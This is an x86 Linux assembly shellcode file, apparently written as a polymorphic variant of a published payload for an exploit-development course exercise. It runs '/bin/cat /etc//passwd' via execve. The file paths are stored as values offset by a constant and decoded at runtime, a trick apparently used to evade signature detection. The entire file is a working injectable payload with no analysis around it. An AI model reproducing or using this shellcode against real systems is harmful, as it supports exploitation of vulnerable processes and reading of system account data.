; linux/x86 cat /etc/passwd 43 bytes originally
; original: http://shell-storm.org/shellcode/files/shellcode-571.php, polymorphic for SLAE
 
section .text
        global _start
 
_start:
	sub eax,eax
	push eax
	push dword 0x6350521e
	push dword 0x5d58511e
	push esp
	pop ebx
	mov esi,0x11111111
	add dword [esp],esi
	add dword [esp+4],esi
	push eax
	push dword 0x53666262
	push dword 0x505f1e1e
	push dword 0x5263541e
	push esp
	pop ecx
	add dword [ecx],esi
	add dword [esp+4],esi
	add dword [ecx+8],esi
	push eax
	push byte 0xb
	pop eax
	push ecx
	push ebx
	push esp
	pop ecx
	int 0x80
